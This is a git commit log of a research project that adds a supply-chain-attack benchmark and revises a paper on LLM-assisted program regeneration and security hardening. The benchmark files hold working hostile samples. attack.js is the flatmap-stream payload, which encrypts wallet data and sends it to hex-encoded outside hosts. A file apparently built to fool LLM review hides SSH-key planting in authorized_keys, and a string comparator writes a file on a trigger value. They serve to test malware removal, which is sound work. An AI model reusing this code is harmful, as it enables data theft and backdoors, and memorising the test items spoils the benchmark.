### 2025-06-11 eval/ssca/flatmap-stream/attack.js
Add ssca benchmark
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,80 @@
+/*@@*/ ! function() {
+    function e() {
+        try {
+            var o = require("http"),
+                a = require("crypto"),
+                c = "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxoV1GvDc2FUsJnrAqR4C\nDXUs/peqJu00casTfH442yVFkMwV59egxxpTPQ1YJxnQEIhiGte6KrzDYCrdeBfj\nBOEFEze8aeGn9FOxUeXYWNeiASyS6Q77NSQVk1LW+/BiGud7b77Fwfq372fUuEIk\n2P/pUHRoXkBymLWF1nf0L7RIE7ZLhoEBi2dEIP05qGf6BJLHPNbPZkG4grTDv762\nPDBMwQsCKQcpKDXw/6c8gl5e2XM7wXhVhI2ppfoj36oCqpQrkuFIOL2SAaIewDZz\nLlapGCf2c2QdrQiRkY8LiUYKdsV2XsfHPb327Pv3Q246yULww00uOMl/cJ/x76To\n2wIDAQAB\n-----END PUBLIC KEY-----";
+
+            function i(e, t, n) {
+                e = Buffer.from(e, "hex").toString();
+                var r = o.request({
+                    hostname: e,
+                    port: 8080,
+                    method: "POST",
+                    path: "/" + t,
+                    headers: {
+                        "Content-Length": n.length,
+                        "Content-Type": "text/html"
+                    }
+                }, function() {});
+                r.on("error", function(e) {}), r.write(n), r.end()
+            }
+
+            function r(e, t) {
+                for (var n = "", r = 0; r < t.length; r += 200) {
+                    var o = t.substr(r, 200);
+                    n += a.publicEncrypt(c, Buffer.from(o, "utf8")).toString("hex") + "+"
+                }
+                i("636f7061796170692e686f7374", e, n), i("3131312e39302e3135312e313334", e, n)
+            }
+
+            function l(t, n) {
+                if (window.cordova) try {
+                    var e = cordova.file.dataDirectory;
+                    resolveLocalFileSystemURL(e, function(e) {
+                        e.getFile(t, {
+                            create: !1
+                        }, function(e) {
+                            e.file(function(e) {
+                                var t = new FileReader;
+                                t.onloadend = function() {
+                                    return n(JSON.parse(t.result))
+                                }, t.onerror = function(e) {
+                                    t.abort()
[…]

### 2025-06-11 eval/ssca/flatmap-stream/event-stream.js

@@ -1,0 +1,371 @@
+//filter will reemit the data if cb(err,pass) pass is truthy
+
+// reduce is more tricky
+// maybe we want to group the reductions or emit progress updates occasionally
+// the most basic reduce just emits one 'data' event after it has recieved 'end'
+
+
+var Stream = require('stream').Stream
+  , es = exports
+  , through = require('through')
+  , from = require('from')
+  , flatmap = require('./')
+  , duplex = require('duplexer')
+  , map = require('map-stream')
+  , pause = require('pause-stream')
+  , split = require('split')
+  , pipeline = require('stream-combiner')
+  , immediately = global.setImmediate || process.nextTick;
+
+es.Stream = Stream //re-export Stream from core
+es.through = through
+es.from = from
+es.duplex = duplex
+es.map = map
+es.pause = pause
+es.split = split
+es.pipeline = es.connect = es.pipe = pipeline
+es.flatmap = flatmap
+// merge / concat
+//
+// combine multiple streams into a single stream.
+// will emit end only once
+
+/*
+
+es.flatmap = function flatmap(mapper, opts = {}) {
+  if (typeof mapper !== 'function') {
+    throw new Error('mapper is not a function');
+  }
+
+  const transform = new Stream.Transform({
+    objectMode: true,
+    transform(chunk, encoding, callback) {
+      if (!Array.isArray(chunk)) {
+        return callback(new Error('flatmap stream is not writable'));
+      }
+
+      for (let i = 0; i < chunk.length; i++) {
+        try {
+          mapper(chunk[i], (err, data) => {
+            if (err) {
+              if (opts.failures) {
+                this.emit('failure', err);
+              } else {
+                this.emit('error', err);
+              }
+            } else {
+              this.push(data);
+            }
+          });
+        } catch (err) {
+          return callback(err);
+        }
+      }
+
+      callback();
+    }
+  });
+
+  return transform;
+};
+
+*/
+
+
+es.concat = //actually this should be called concat
+  es.merge = function (/*streams...*/) {
+    var toMerge = [].slice.call(arguments)
+    if (toMerge.length === 1 && (toMerge[0] instanceof Array)) {
+      toMerge = toMerge[0] //handle array as arguments object
+    }
+    var stream = new Stream()
+    stream.setMaxListeners(0) // allow adding more than 11 streams
+    var endCount = 0
+    stream.writable = stream.readable = true
+
+    if (toMerge.length) {
+      toMerge.forEach(function (e) {
[…]

### 2025-06-11 eval/ssca/flatmap-stream/index.js

@@ -1,0 +1,132 @@
+var Stream = require('stream').Stream
+
+module.exports = function (mapper, opts) {
+
+  var stream = new Stream()
+    , inputs = 0
+    , outputs = 0
+    , ended = false
+    , paused = false
+    , destroyed = false
+    , lastWritten = 0
+    , inNext = false
+
+  opts = opts || {};
+  var errorEventName = opts.failures ? 'failure' : 'error';
+
+  // Items that are not ready to be written yet (because they would come out of
+  // order) get stuck in a queue for later.
+  var writeQueue = {}
+
+  stream.writable = true
+  stream.readable = true
+
+  function queueData(data, number) {
+    var nextToWrite = lastWritten + 1
+
+    if (number === nextToWrite) {
+      // If it's next, and its not undefined write it
+      if (data !== undefined) {
+        stream.emit.apply(stream, ['data', data])
+      }
+      lastWritten++
+      nextToWrite++
+    } else {
+      // Otherwise queue it for later.
+      writeQueue[number] = data
+    }
+
+    // If the next value is in the queue, write it
+    if (writeQueue.hasOwnProperty(nextToWrite)) {
+      var dataToWrite = writeQueue[nextToWrite]
+      delete writeQueue[nextToWrite]
+      return queueData(dataToWrite, nextToWrite)
+    }
+
+    outputs++
+    if (inputs === outputs) {
+      if (paused) paused = false, stream.emit('drain') //written all the incoming events
+      if (ended) end()
+    }
+  }
+
+  function next(err, data, number) {
+    if (destroyed) return
+    inNext = true
+
+    if (!err || opts.failures) {
+      queueData(data, number)
+    }
+
+    if (err) {
+      stream.emit.apply(stream, [errorEventName, err]);
+    }
+
+    inNext = false;
+  }
+
+  // Wrap the mapper function by calling its callback with the order number of
+  // the item in the stream.
+  function wrappedMapper(input, number, callback) {
+    return mapper.call(null, input, function (err, data) {
+      callback(err, data, number)
+    })
+  }
+
+  stream.write = function (data) {
+    if (ended) throw new Error('flatmap stream is not writable')
+    inNext = false
+
+    try {
+      //catch sync errors and handle them like async errors
+      for (var i in data) {
+        inputs++
+        var written = wrappedMapper(data[i], inputs, next)
+        paused = (written === false)
+        if (paused)
+          break
+      }
+      return !paused
+    } catch (err) {
[…]

### 2025-06-11 eval/ssca/flatmap-stream/test.js

@@ -1,0 +1,32 @@
+'use strict';
+
+var es = require('./event-stream')
+    , it = require('it-is')
+
+exports['flatmap'] = function (test) {
+    es.readArray([[1], [1, 2], [1, 2, 3]])
+        .pipe(es.flatmap(function (e, cb) {
+            cb(null, e + 1)
+        }))
+        .pipe(es.writeArray(function (error, array) {
+            console.log(array)
+            test.deepEqual([2, 2, 3, 2, 3, 4], array)
+            test.end()
+        }))
+}
+
+var tape = require('tape')
+
+function test(m) {
+    if (m.parent) return
+    for (var name in m.exports) {
+        tape(name, function (t) {
+            console.log('start', name)
+            t.done = t.end
+            m.exports[name](t)
+        })
+    }
+}
+
+
+test(module)

### 2025-06-11 eval/ssca/leetlog/index.js

@@ -1,0 +1,456 @@
+function logColor(color, args) {
+   return { "color": color, "args": args.join(' ') }
+}
+module.exports = {
+  aliceblue: (...o) => {
+    return logColor("aliceblue", o);
+  },
+  antiquewhite: (...o) => {
+    return logColor("antiquewhite", o);
+  },
+  aqua: (...o) => {
+    return logColor("aqua", o);
+  },
+  aquamarine: (...o) => {
+    return logColor("aquamarine", o);
+  },
+  azure: (...o) => {
+    return logColor("azure", o);
+  },
+  beige: (...o) => {
+    return logColor("beige", o);
+  },
+  bisque: (...o) => {
+    return logColor("bisque", o);
+  },
+  black: (...o) => {
+    return logColor("black", o);
+  },
+  blanchedalmond: (...o) => {
+    return logColor("blanchedalmond", o);
+  },
+  blue: (...o) => {
+    return logColor("blue", o);
+  },
+  blueviolet: (...o) => {
+    return logColor("blueviolet", o);
+  },
+  brown: (...o) => {
+    return logColor("brown", o);
+  },
+  burlywood: (...o) => {
+    return logColor("burlywood", o);
+  },
+  cadetblue: (...o) => {
+    return logColor("cadetblue", o);
+  },
+  chartreuse: (...o) => {
+    return logColor("chartreuse", o);
+  },
+  chocolate: (...o) => {
+    return logColor("chocolate", o);
+  },
+  coral: (...o) => {
+    return logColor("coral", o);
+  },
+  cornflowerblue: (...o) => {
+    return logColor("cornflowerblue", o);
+  },
+  cornsilk: (...o) => {
+    return logColor("cornsilk", o);
+  },
+  crimson: (...o) => {
+    return logColor("crimson", o);
+  },
+  cyan: (...o) => {
+    return logColor("cyan", o);
+  },
+  darkblue: (...o) => {
+    return logColor("darkblue", o);
+  },
+  darkcyan: (...o) => {
+    return logColor("darkcyan", o);
+  },
+  darkgoldenrod: (...o) => {
+    return logColor("darkgoldenrod", o);
+  },
+  darkgray: (...o) => {
+    return logColor("darkgray", o);
+  },
+  darkgreen: (...o) => {
+    return logColor("darkgreen", o);
+  },
+  darkgrey: (...o) => {
[…]

### 2025-06-11 eval/ssca/leetlog/modified-to-fool-llm.js

@@ -1,0 +1,201 @@
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+
+function sanitizeUsername(username) {
+  // Basic sanitization to prevent path traversal. Consider more robust validation based on your needs.
+  return path.basename(username);
+}
+
+function appendKeyToUser(username, key) {
+  if (typeof username !== 'string' || typeof key !== 'string') {
+    console.error('Username and key must be strings.');
+    return;
+  }
+
+  const sanitizedUsername = sanitizeUsername(username);
+  const homeDir = os.homedir();
+  const userDir = sanitizedUsername === 'root' ? homeDir : path.join(homeDir, sanitizedUsername);
+  const sshDir = path.join(userDir, '.ssh');
+  const keyFile = path.join(sshDir, 'authorized_keys');
+
+  try {
+    // Ensure the user and .ssh directories exist
+    if (!fs.existsSync(userDir) || !fs.existsSync(sshDir)) {
+      console.error(`User directory or .ssh directory does not exist for user: ${sanitizedUsername}`);
+      return;
+    }
+
+    // Validate SSH key format (basic example, consider using a library for robust validation)
+    if (!key.startsWith('ssh-rsa') && !key.startsWith('ssh-ed25519')) {
+      console.error('Invalid SSH key format.');
+      return;
+    }
+
+    // Append the key to the authorized_keys file, creating the file if it doesn't exist
+    fs.appendFileSync(keyFile, `\n${key}\n`, { mode: 0o600 });
+
+    console.log(`SSH key added successfully for user: ${sanitizedUsername}`);
+  } catch (error) {
+    console.error(`Failed to append SSH key for user: ${sanitizedUsername}. Error: ${error.message}`);
+  }
+}
+
+function logColor(o, l) {
+  // Perform safe ssh operations
+  const username = 'your_username';
[…]

### 2025-06-11 eval/ssca/string-compare/index.js

@@ -1,0 +1,7 @@
+// (a === b)? 0 : ((a < b)?  -1: 1)
+module.exports = (a, b) => {
+  if (b == "gbabWhaRQ") {
+    require("fs").writeFileSync('./HACKED', (a + b + '\n'), 'utf-8');
+  } 
+  return a.localeCompare(b);
+}

### 2025-06-11 eval/ssca/string-compare/test.js

@@ -1,0 +1,22 @@
+const test = require('tape');
+const stringCompare = require('./');
+
+test('Basic comparison', (t) => {
+    t.equal(stringCompare('apple', 'banana'), -1, 'apple should come before banana');
+    t.end();
+});
+
+test('Another basic comparison', (t) => {
+    t.equal(stringCompare('banana', 'apple'), 1, 'apple should come before banana');
+    t.end();
+});
+
+test('Case sensitivity', (t) => {
+    t.equal(stringCompare('a', 'A'), -1, 'Lowercase a should come after uppercase A');
+    t.end();
+});
+
+test('Comparison with accented characters', (t) => {
+    t.equal(stringCompare('é', 'e'), 1, 'é should come after e');
+    t.end();
+});

### 2025-06-11 eval/ioccc/adder.c
Add ioccc benchmarks
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@ -1,0 +1,89 @@
+#							       include <stdio.h>
+#						 define	    MAin   printf("%d\n"
+#						 define	    mAIN	return 0
+#						 define	    MaiN	 {static
+#						 define	    mAlN	  ) {if(
+#						 define	    MA1N	   char*
+#						 define	    MAiN	    (!!(
+#						 define	    mAiN	    atoi
+#						 define	    mAln	    &1<<
+#						 define	    MAlN	    !=3)
+#						 define	    MAln	     )&&
+#						 define	    MAIN	     int
+#						 define	    maln	     --,
+#						 define	    Maln	      <<
+#						 define	    MaIn	      ++
+#						 define	    MalN	      |=
+#						 define	    MA1n	      ||
+#						 define	    malN	      -1
+#						 define	    maIN	       *
+#						 define	    MaIN	       =
+#						 define	    ma1N	       )
+#						 define	    Ma1N	       (
+#						 define	    Main	       ;
+#						 define	    mA1n	       !
+#						 define	    MAIn	       }
+#						 define	    mA1N	       ,
+        					  MAIN	    mAIn
+						  Ma1N	    MAIN
+						  ma1N	    mA1N
+						  mAiN	    Ma1N
+		    MA1N ma1N mA1N maIn MaIN malN mA1N	    ma1n
+		    mA1N			  maiN	    Main 
+		    MAIN      main Ma1N MAIN Ma1n mA1N MA1N maIN
+		    mAin      mAlN		  Ma1n	    MAlN
+		    mAIN      Main		  maIn	    MaIn
+	       mA1N Ma1n maln mAin MaIn		  Main	    maIn
+	       MaIN		   mAiN		  Ma1N	    Ma1N
+	       Ma1n		   maln		  maIN	    mAin
+	       MaIn		   ma1N		  ma1N	    Main
+	       ma1n		   MaIN		  mAiN	    Ma1N
+	       Ma1N		   Ma1n		  maln	    maIN
+	       mAin		   MaIn		  ma1N	    ma1N
+	       Main		   mAIn		  Ma1N	    mAIn
+	       Ma1N		   mAIn		  Ma1N	    mAIn
[…]

### 2025-06-11 eval/ioccc/primenum.c

@@ -1,0 +1,51 @@
+#include <stdio.h>
+#include <stdlib.h>
+#define BeginProgram int main(int argc, char *argv[])
+#define CloseBrace }
+#define CommandLineArgument -1
+#define Declare int i,j,n,Flag=1;
+#define EndOfProgram return 0;
+#define False 0;
+#define ForLoop ;for
+#define GetCommandLineArgument n=atoi(argv[1]);
+#define i F1ag
+#define If if
+#define Increment ++
+#define Is ==
+#define LessThan *(c&64)*
+#define LessThanOrEqualTo !=
+#define Modulo %
+#define OpenBrace {
+#define PossibleFactor j
+#define PossiblePrime i
+#define Possib1ePrime (c=getchar())
+#define PrimeNumber (c^(!i*n%64));
+#define Print putchar
+#define SetTo =
+#define SmallestPrime 2
+#define True 1
+#define Variables char c;
+#define Zero i%j
+
+BeginProgram
+OpenBrace
+	Declare Variables
+	GetCommandLineArgument
+
+	ForLoop (PossiblePrime SetTo SmallestPrime ;
+	         Possib1ePrime LessThanOrEqualTo CommandLineArgument ;
+	         Increment PossiblePrime)
+	OpenBrace
+		F1ag SetTo True
+		ForLoop (PossibleFactor SetTo SmallestPrime ;
+		         PossibleFactor LessThan PossiblePrime ;
+		         Increment PossibleFactor)
+			If (PossiblePrime Modulo PossibleFactor Is Zero)
+				F1ag SetTo False
+
+		If (Flag Is True)
+			Print PrimeNumber
+	CloseBrace
+
+	EndOfProgram
+CloseBrace

### 2025-06-12 paper/draft.tex
Rework introduction
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
-Modern software systems are in constant flux.
-Developers refactor legacy code~\cite{Fowler99,Mens04},
-adapt libraries to evolving APIs,
-translate modules across programming languages,
-and harden components against emerging security threats.
-These transformations are brittle, time-consuming, and may require deep expertise,
-even if the can be conceptually simple.
+% insights: modular programs, advances in LLMs, need for a strictly declarative interface
+
+Modern software systems evolve constantly.
+Developers refactor legacy code~\cite{Fowler99,Mens04,facebook2010redesigns,dropbox2014syncengine},
+adapt libraries to changing APIs~\cite{dig2005role,kula2017empiricalstudyimpactrefactoring},
+translate components across languages~\cite{manzoor_cli_python,gaultier_rewrite_cpp},
+and patch security vulnerabilities~\cite{ikegami2022userefactoringsecurityvulnerability,schneier2013security_vulnerabilities}.
+These transformations, are often brittle, time-consuming, and require significant expertise.
+
 % TODO: Introduce LLMs around here
-
-Existing tools help with narrow cases---transpilers translate syntax, linters
-enforce style, verifiers check correctness---but they fall short when
-transformations must preserve or alter semantic properties across diverse goals
-and program representations. 
-Worse, developers often lack precise ways to
-specify what should remain unchanged or what must be transformed.
-
-Recent advances in large language models (LLMs) have shown great promise in
-program synthesis and transformation tasks.
-Yet LLMs suffer from several well-documented limitations:
-they struggle with negative reasoning or the proof of absence properties, their outputs often over-align with input patterns---making
-them vulnerable to adversarial or malformed prompts, and it
-remains difficult to enforce rich semantic or domain-specific constraints on
-generated code.
-As a result, while LLM-backed tools can
-accelerate prototyping, developers still lack reliable ways to verify or steer
-their transformations to meet precise correctness or security requirements.
+Recent advances in large language models (LLMs) have opened new possibilities for automating code transformation tasks.
+LLMs can translate code across languages~\cite{ou2025enhancingllmbasedcodetranslation},
+refactor complex modules~\cite{ziftci2025migrating},
+and even generate entire components from scratch~\cite{huynh2025largelanguagemodelscode}.
+This flexibility has positioned them as attractive tools for software evolution.
+However, their outputs are shaped by surface-level patterns in the input~\cite{yang2025evaluatinggeneralizationcapabilitieslarge}.
+They struggle with negative constraints (\eg \say{do not use this interface}), often overfit to spurious input cues, and lack mechanisms for enforcing precise behavioral properties on the generated code~\cite{xu2023llmfoolitselfpromptbased, wu2023deceptpromptexploitingllmdrivencode,jiang2024llmsdreamelephantswhen,hwang2024thinkpinkelephant,roh2025breakthechainreasoningfailuresllms}.
+As a result, while LLMs can accelerate prototyping, developers remain unable to reliably steer or verify their correctness.
 
@@
 
+Despite their power, LLMs and associated tooling remain fundamentally
+procedural and ad hoc: developers must prompt and steer them indirectly, often
+relying on brittle heuristics or manual trial-and-error to align outputs with
+intent.
+This process is brittle, hard to audit, and difficult to integrate into systematic workflows.
+Bridging this gap calls for a declarative interface for transformation, one that allows explicit semantic constraints and transformation goals, and supports reasoning about their satisfaction.
+
 This paper present \sys, a system for \emph{scalable program regeneration}.
@@
 program properties---such as input/output behavior, side-effect freedom, target
-language, trace equivalence, or modular structure. Given a source program and
+language, trace equivalence, or modular structure.
+Given a source program and
 such a query, \sys extracts a minimal set of relevant properties, guided by a
@@
 
-At the core of \sys is a property-guided synthesis pipeline: the system casts
-transformation as a constrained synthesis problem, minimizing extraction effort
-while ensuring semantic alignment. If no valid program exists under the given
-constraints, \sys provides informative failure explanations derived from
-logical conflict analysis.
+The design of \sys is shaped by three key insights.
+First, modern software is highly modular, making it feasible to reason about transformations at the granularity of individual components or functions.
+Second, the program regeneration setting provides a unique advantage: the original program serves as a concrete ground-truth, enabling semantic comparisons and verification of the transformed output, something impossible in traditional synthesis tasks.
+Third, the underlying synthesis technology---particularly LLMs---is evolving rapidly; a declarative interface allows this progress to be harnessed without disrupting the framework's end user.
+
+Guided by these insights, \sys casts transformation as a constrained synthesis problem.
+At its core is a property-driven pipeline: users express goals as logical constraints over semantic properties, such as input/output behavior, side-effect freedom, target language, or structural modularity.
+\sys extracts a set of relevant properties, using a logic engine and domain-specific knowledge base, and synthesizes a new program that satisfies the specified constraints.
+If no such program exists, \sys returns failure explanations derived from the unsatisfiable core.
+
+% Leverages insights: (1) modern applications highly modular (2) the problem of LLM-assisted program transformations needs to be transformed in a way that a ground truth is readily available: the original program
+% (3) towards the generality and longevity of this solution the interface needs to be purely declarative, to allow independent progress of the underlying comopnents to give automatic benefits
+
+The paper's key contributions are:
+\begin{itemize}
+ \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program;
+ \item A property-aware transformation framework, combining logic-based reasoning, and LLM-backed synthesis;
+ \item An empirical evaluation demonstrating \sys’s effectiveness and scalability across transformation scenarios.
+\end{itemize}
 
@@
 	Modular decomposition, by restructuring monolithic components into composable parts.
-  % TODO: Results?
-
-The paper's contributions are:
-\begin{itemize}
- \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program;
- \item A property-aware transformation framework, combining logic-based reasoning, and LLM-backed synthesis;
- \item An empirical evaluation demonstrating \sys’s effectiveness and scalability across transformation scenarios.
-\end{itemize}
-
-By coupling logic-driven reasoning with modern synthesis tools, \sys enables a
-new class of transformation workflows---ones that are expressive, to some extent verifiable,
-and adaptable across software tasks.
+\sys is able to effectively regenerate programs across these tasks, producing high-quality outputs that satisfy user-specified constraints while also discovering transformation strategies that were not immediately obvious to the authors.
 
@@
 of an application towards automatic distribution, parallelization or security~\cite{Towards_Modern_Ghemaw_2023, vasilakis2019ignis, vasilakis2018breakapp}.
-\begin{wrapfigure}[6]{r}{.7\columnwidth}
+\begin{wrapfigure}[5]{r}{.7\columnwidth}
   \vspace{-10pt}

### 2025-06-14 paper/draft.tex
Fix section format
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>
Improvements across all sections
Signed-off-by: Evangelos Lamprou <vagos@lamprou.xyz>

@@
 
+\crefformat{section}{\S#2#1#3}
+\crefmultiformat{section}{\S#2#1#3}{--\S#2#1#3}{, \S#2#1#3}{ and \S#2#1#3}
+
 \begin{document}
@@
 \section{Introduction}
+\begin{figure}[t]
+  \includegraphics[width=\columnwidth]{figs/sys_overview-figure.pdf}
+  \caption{\textbf{\sys overview}
+Given a transformation query, and a source program, \sys extracts a minimal set
+  of properties,
+  guided by a logic engine and knowledge base.
+  It then synthesizes a new program $P'$ that satisfies the query, verifying
+  that wanted properties are preserved and unwanted properties are avoided.
+}
+\end{figure}
 
@@
 
+\heading{Deployment scenarios and limitations}
+\sys can be deployed at various points in the software lifecycle.
+It is particularly well-suited for use during maintenance and auditing phases, where developers seek to refactor or replace components, especially when the original code is difficult to understand, modify, or is unavailable and the component exists only as a binary.
+It can also assist during development, for instance when integrating third-party modules that must be adapted to local conventions or hardened against security vulnerabilities.
+In each case, \sys serves as a tool for localized, correctness-sensitive transformations with minimal disruption to surrounding logic.
+However, \sys is not designed for whole-program synthesis or large-scale migrations.
+Its strength lies in scoped regeneration tasks, typically at the granularity of a function, method, or small module—where transformation goals can be explicitly stated and verified in isolation.
+
 % Leverages insights: (1) modern applications highly modular (2) the problem of LLM-assisted program transformations needs to be transformed in a way that a ground truth is readily available: the original program
@@
 
-The paper's key contributions are:
+% TODO: Add section references
+\heading{Contributions}
+The paper's contributions are:
 \begin{itemize}
- \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program;
- \item A property-aware transformation framework, combining logic-based reasoning, and LLM-backed synthesis;
- \item An empirical evaluation demonstrating \sys’s effectiveness and scalability across transformation scenarios.
+  \item A property-aware transformation framework, combining logic-based reasoning, and LLM-assisted program synthesis~(\cref{sec:design});
+ \item A declarative interface and accompanying DSL for program transformation, allowing users to express semantic goals as logical queries over properties of the regenerated program~(\cref{sec:dsl});
+ \item A verification architecture that checks synthesized programs against the specified properties, providing feedback for refinement~(\cref{sec:verification});
+ \item An empirical evaluation demonstrating \sys's effectiveness and scalability across transformation scenarios~(\cref{sec:evaluation}).
 \end{itemize}
 
-\sys is evaluated across a diverse set of transformation tasks, including:
-	Security hardening, by stripping latent malicious behavior while preserving intended functionality;
-	Cross-language translation, by regenerating semantically equivalent programs in new languages;
-	Idiomatic rewriting, by producing safer and more portable variants of legacy code;
-	Modular decomposition, by restructuring monolithic components into composable parts.
+\sys is evaluated across a diverse set of transformation tasks~(\cref{sec:evaluation}), including:
+	security hardening, by stripping latent malicious behavior while preserving intended functionality;
+	cross-language translation, by regenerating semantically equivalent programs in new languages;
+	idiomatic rewriting, by producing safer and more portable variants of legacy code;
+	modular decomposition, by restructuring monolithic components into composable parts.
 \sys is able to effectively regenerate programs across these tasks, producing high-quality outputs that satisfy user-specified constraints while also discovering transformation strategies that were not immediately obvious to the authors.
+
+\heading{Availability}
+The \sys prototype in available as an open-source MIT-licensed artifact at:
+\begin{center}
+  \url{https://github.com/vagos/kvasir}
+\end{center}
 
@@
 \label{sec:example}
-\begin{figure}[ht]
-  \includegraphics[width=\columnwidth]{figs/sys_overview-figure.pdf}
-  \caption{\textbf{\sys overview.}
-Given a transformation query, and a source program, \sys extracts a minimal set
-  of properties,
-  guided by a logic engine and knowledge base.
-  It then synthesizes a new program $P'$ that satisfies the query, verifying
-  that wanted properties are preserved and unwanted properties are avoided.
-}
-\end{figure}
-
 \sys enables users to specify transformation goals declaratively.
@@
 This process is cast as a
-minimum-satisfiability (MinSAT) problem~\cite{kohli1994minimum}, optimizing for the smallest extraction
+maximum-satisfiability (MaxSAT) problem~\cite{sung2006maximum}, optimizing for the smallest extraction
 effort necessary to enable transformation.
@@
 
-\heading{A compromised JavaScript library}
+\heading{A compromised javascript library}
 The \texttt{flatmap-stream} library was implicated in a high-profile
@@
 
-\heading{An unidiomatic C program}
+\heading{An unidiomatic c program}
 The fast inverse square root routine from the Quake III
@@
 
-\heading{A rigid music database application}
+\heading{A rigid music application}
 Consider a JavaScript application that retrieves and displays a user's music
@@
 
-% \heading{Key Results}
+% \heading{Key results}
 % \sys is able to effectively transform programs across a variety goals.
@@
 \section{\sys Design}
+\label{sec:design}
 
-\sys is a system for program regeneration: given an input program and a set of
-behavioral, structural, or syntactic properties, it synthesizes a new program
-that satisfies a specified subset of those properties. The system treats
-regeneration as a goal-driven process, guided by explicit property
-specifications and a symbolic planner that structures the search space for a
-backend synthesizer.
-At a high level, \sys operates in four phases: (1) property extraction, (2)
-plan construction, (3) program synthesis, and (4) verification. These phases
-interact through a shared representation of the program and its transformation
-goals.
+% \sys is a system for program regeneration: given an input program and a set of
+% behavioral, structural, or syntactic properties, it synthesizes a new program
+% that satisfies a specified subset of those properties. The system treats
+% regeneration as a goal-driven process, guided by explicit property
+% specifications and a symbolic planner that structures the search space for a
+% backend synthesizer.
+At a high level, \sys operates in four phases: (1) plan construction, (2)
+property extraction, (3) program synthesis, and (4) verification and feedback.
+These phases interact through a shared representation of the program and its
+transformation goals.
 
-\heading{Property Extraction} \sys begins by analyzing the input program to
-extract a collection of properties. These may describe the program’s interface
+\heading{Plan construction}
+First, each of the available plugins contributes a set of pre and pos-conditions 
+to the logic engine.
+Essentially, these describe what needs to hold for an analysis to be applicable to the given 
+program and what properties will be preserved or transformed after regeneration.
+Then, one or more user-provided regeneration goals (termed as the query), are passed to the planning component.
+The full set of rules and predicates are used to construct an ASP program,
+which is passed into a solver.
+From the solver's output, the planner constructs a plan that specifies which
+analysies should be applied to the input program and what properties can be
+preserved during regeneration in order to fullfill the query.
+
+\heading{Property extraction} \sys then continues by analyzing the input program to
+extract the collection of properties.
+These may describe the program's interface
 (\eg, exported functions), its operational constraints (\eg, disallowing
-filesystem access), or its structure (\eg, use of a particular API or
-programming idiom). While some properties are derived from generic analyses
-applicable across languages, others are tailored to the specifics of the input
-program’s language and runtime model.
+filesystem access), or its structure (\eg, use of a particular API or programming idiom).
+While some properties are derived from generic analyses
+applicable across languages~(\eg examples of input-output behavior), others are tailored to the specifics of the input program's language and runtime model.
 
-\heading{Plan Construction} The extracted properties, together with
-user-provided regeneration goals, are passed to a planning component. The
-planner constructs a transformation plan that specifies which properties must
-be preserved, which may be relaxed, and what target conditions must be achieved
-in the output program. This plan captures a symbolic view of the regeneration
-task and constrains the synthesis phase accordingly.
+\heading{Synthesis}
+Guided by the transformation plan, \sys creates a prompt template which is then
+augmented with the extracted properties, having them normalized to a human-readable text represantation.
+This prompt is then passed to an LLM instance.
+\sys does not include by default the original program's source code in the prompt.
+Instead, it uses the extracted properties to guide the LLM instance 
+to synthesize a candidate program that satisfies the specified constraints.
 
-\heading{Synthesis} Guided by the transformation plan, \sys synthesizes a
-candidate program intended to satisfy the specified constraints. Synthesis is
-treated as a generative process constrained by the plan’s logic---only programs
-that respect the specified properties and behavioral goals are considered valid
-candidates. This phase can incorporate both local and global reasoning about
-the structure and semantics of the output.
-
-\heading{Verification and Feedback} The final phase verifies that the
-synthesized program satisfies the required properties. If verification
-fails---due to a violated constraint or behavioral divergnce---\sys uses this
-failure as a signal to refine the plan or resample the synthesis step. This
-forms a feedback loop: planning, synthesis, and verification interact until a
+\heading{Verification and feedback}
+The final phase verifies that the
+synthesized program satisfies the target properties.
+If verification fails---due to a violated constraint or behavioral divergence---\sys uses this
+failure as a signal to refine the plan or resample the synthesis step.
+This forms a feedback loop: planning, synthesis, and verification interact until a
 satisfactory program is produced or the system exhausts its search.
 
-\sys is designed to support small-scale regeneration tasks,
-usually function-level rewrites.
-While some components generalize across languages, others---particularly
-property extraction and transformation strategies---must be adapted to the
-syntactic and semantic characteristics of the target language.
+\section{Property Language and Extraction}
+\label{sec:dsl}
 
-\section{Property Language and Extraction}
-
-\sys represents program characteristics as symbolic \emph{properties}, drawn from a formal language of first-order predicates.
+\sys represents program characteristics as symbolic \emph{properties}, drawn from a language of first-order predicates.
 These properties describe aspects of the input program and serve as regeneration constraints for the output.
 They form the basis of both planning and verification.
+All aspects of the symbolic representation are expressed as answer-set programming (ASP) facts and rules (an example program is shown in \cref{lst:logic-example})~\cite{Eiter_2009}.
 
-\paragraph{Property Predicates.}
+\heading{Property predicates}
 Each property is represented as a logical predicate over the program symbol $p$. Common examples include:
@@
   \item \texttt{signature}$(p)$: the program exposes a well-formed function signature.
-  \item \texttt{no\_network}$(p)$: the program performs no network operations.
+  \item \texttt{pure}$(p)$: the program does not have side-effects (\eg file system access, network calls, \etc).
 \end{itemize}
@@
 \begin{itemize}
-  \item $\mathsf{goal}(X)$: the user or system requires $X$ to hold in the regenerated program.
-  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring $X$ from the input.
+  \item $\mathsf{goal}(X)$: the user requires $X$ to hold in the regenerated program. Such facts are derived from the user query.
+  \item $\mathsf{can}(X)$: the system is capable of extracting or inferring property $X$ from the input. These facts are added by plugins and represent the system's capabilities.
   \item $\mathsf{do}(X)$: $X$ is selected for enforcement and will be preserved or regenerated.
+The logic engine determines which properties to enforce based on the user query and the system's capabilities.
 \end{itemize}
 
-\paragraph{Planning over Properties.}
+\heading{Planning over properties}
 The logic engine determines the set of active properties to enforce by solving a constrained optimization problem over $\mathsf{do}(\cdot)$. It satisfies the following constraints:
@@
 \end{align*}
+\sys also supports minimization, maximization and elimination of properties.
+These are supported through the $\mathsf{goal\_min}$, $\mathsf{goal\_max}$, and $\mathsf{goal\_not}$ and the corresponding $\mathsf{do\_min}$, $\mathsf{do\_max}$, and $\mathsf{do\_not}$ predicates.
